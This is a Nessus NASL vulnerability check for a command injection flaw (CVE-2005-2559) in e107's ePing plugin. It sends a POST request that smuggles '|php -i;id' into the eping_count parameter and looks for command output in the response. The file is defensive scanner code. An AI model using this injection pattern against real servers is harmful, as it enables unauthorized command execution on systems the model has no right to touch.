#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(18461);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2014/05/21 20:41:39 $");

  script_cve_id("CVE-2005-2559");
  script_bugtraq_id(13929);
  script_osvdb_id(17245, 17288);

  script_name(english:"e107 ePing Plugin doping.php Arbitrary Code Execution");
  script_summary(english:"Tries to execute arbitrary code via the ePing plugin");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is prone to arbitrary
command execution."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The installation of e107 on the remote host includes a version of
the ePing plugin that is affected by a command execution
vulnerability.  This plugin fails to sanitize the 'eping_cmd',
'eping_count' and/or 'eping_host' parameters of the 'doping.php'
script before using them in a system() call.  An attacker can exploit
this flaw to execute arbitrary shell commands subject to the
privileges of the userid under which the affected application runs."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/401862/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/407475/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Upgrade to ePing plugin version 1.03 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/06/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/06/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2014 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);

dir = install['dir'];
url = dir + "/e107_plugins/eping/doping.php";

# Check whether the affected script exists.
r = http_send_recv3(method:"GET",item:url, port:port, exit_on_fail:TRUE);
res = r[2];

# If it looks like doping.php...
if ("potential hacking attempt" >< res)
{
  # Try to exploit the flaw by running "php -i" and "id".
  postdata = "eping_cmd=ping%20-n&" +
    "eping_host=127.0.0.1&" +
    "eping_count=2|php%20-i;id&" +
    "submit=Ping";

  r = http_send_recv3(method:"POST", item:url, port: port,
    content_type: "application/x-www-form-urlencoded",
    data: postdata,
    exit_on_fail:TRUE
  );
  res = r[2];

  # There's a problem if the results look like output from...
  if (
    # either phpinfo or...
    "PHP Version =>" >< res ||
    # the id command.
    egrep(string:res, pattern:"uid=[0-9]+.* gid=[0-9]")
  ) {
   security_hole(port);
   exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", build_url(qs:dir, port:port));
